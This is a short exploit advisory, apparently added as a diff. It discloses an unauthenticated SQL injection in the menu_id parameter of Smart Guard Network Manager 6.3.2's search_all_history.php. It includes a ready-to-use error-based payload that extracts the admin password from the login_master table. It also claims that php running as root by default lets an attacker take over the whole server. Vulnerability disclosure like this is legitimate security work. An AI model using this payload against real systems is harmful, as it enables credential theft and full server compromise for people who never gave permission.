@@ -1,0 +1,27 @@
+# Exploit Title: SQL Injection In Smart Guard Network Manager Api
+# Date: 03/12/2016
+# Exploit Author: Rahul Raz
+# Vendor Homepage: http://www.xsinfoways.com/
+# Software Name: Smart Guard Network Manager
+# Version: 6.3.2
+# Tested on: Ubuntu Linux
+
+Vulnerability type: CWE-89: Improper Neutralization of Special Elements
+used in an SQL Command ('SQL Injection')
+
+The menu_id GET parameter on <base url>/view_logs/search_all_history.php in
+not filtered properly and leads to SQL Injection
+
+Authentication Required: No
+
+SQL injec type- error/xpath.
+
+Any unauthenticated user can inject SQL commands on the <base-url>
+/view_logs/search_all_history.php?menu_id=-466 and extractvalue(1,(select
+make_set(511,0,SUBSTRING(password,1,20),1) from
+login_master limit 0,1 ))-- -
+
+So an user can fetch admin details and can easily get root on that server
+if server is SmartGuard 6.0A Revolutions as php runs as user root by
+default.
+This this vulnerability can make whole server vulnerable .
